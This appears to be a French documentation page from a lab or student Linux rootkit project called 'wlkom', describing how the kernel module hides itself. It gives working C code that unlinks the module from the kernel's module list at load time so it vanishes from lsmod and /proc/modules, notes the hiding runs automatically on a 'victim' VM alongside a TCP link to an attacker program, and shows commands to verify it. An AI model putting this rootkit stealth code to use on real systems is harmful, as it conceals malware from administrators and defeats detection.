# Cacher le module

---

## Objectif

Empêcher la détection du rootkit via les outils standards d'inspection des modules kernel :

```bash
lsmod | grep wlkom        # ne doit rien afficher
cat /proc/modules         # ne doit pas mentionner wlkom
```

---

## Implémentation

Au chargement d'un module, une macro (`THIS_MODULE`) est créée et contient des informations relative au module (son nom, sa version, son état...). On va se serivr de cette macro pour cacher notre module.

Ce qui nous interresse c'est le champs `struct List_head list` de cette macro.

C'est l'élément qui représente notre module dans la liste des modules chargés sur le kernel.

Pour cacher notre rookit nous allons juste manipuler les elements prev et next pour faire disparaitre notre rootkit (comme montré ci dessous)

La fonction `wlkom_hide_module()` est appelée dès l'initialisation du rootkit.

```c
void wlkom_hide_module(void)
{
    wlkom_erase_from_list(THIS_MODULE->list.prev, THIS_MODULE->list.next);
}

void wlkom_erase_from_list(struct list_head *prev, struct list_head *next)
{
    prev->next = next;
    next->prev = prev;
}
```

!!! danger "Irréversibilité"
Une fois caché, le module ne peut plus être déchargé via `rmmod` (car il n'apparaît plus dans la liste). Le déchargement nécessite un redémarrage de la machine.

---

## Utilisation

La dissimulation du module est **automatique au chargement** : aucune commande CLI n'est nécessaire pour l'activer.

Elle se déclenche à `sudo insmod wlkom.ko` sur la VM victime, avant même que la connexion TCP soit établie. Dès cet instant, le module n'apparaît plus dans `lsmod` ni `/proc/modules`.

!!! note "Aucune commande CLI dédiée"
Il n'existe pas de commande pour cacher ou révéler le module depuis le programme attaquant. La dissimulation est permanente et irréversible tant que la VM victime tourne.

---

## Vérification

Après `sudo insmod wlkom.ko` :

```bash
lsmod | grep wlkom      # aucune sortie
cat /proc/modules | grep wlkom  # aucune sortie
```

Le module est actif (la connexion TCP fonctionne) mais invisible.
